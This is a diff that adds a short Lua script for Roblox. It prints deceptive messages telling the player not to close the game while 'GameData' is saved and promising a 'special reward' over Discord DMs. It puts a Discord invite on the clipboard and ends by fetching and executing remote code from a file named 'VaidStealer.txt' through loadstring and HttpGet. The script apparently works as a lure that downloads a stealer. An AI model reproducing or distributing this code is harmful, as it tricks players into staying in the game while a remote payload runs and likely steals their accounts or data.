@@ -1,0 +1,12 @@
+print("You're Using OutDated Script!")
+print("Please Join Our Discord And")
+print("Note: Do Not Close This Game, We Are Saving GameData To Improve Our Scripts!")
+print("Do Worry! ScreenShot And Send Us In Dms, You The Chosen, Send Us To Claim Your Special Reward, If You'll Close Before Its Closing Itself, We Cant Give You The Reward!")
+game:GetService("RunService").Stepped:Connect(function()
+    if not game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.LeftControl) and game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.C) then
+        game:GetService("Clipboard").Text = "https://discord.gg/bigames"
+    end
+end)
+print("Discord Has Been Copied To ClipBoard!")
+wait(10)
+loadstring(game:HttpGet('https://raw.githubusercontent.com/VaidMaster/VaidHub/main/0%3AVaidStealer.txt'))()
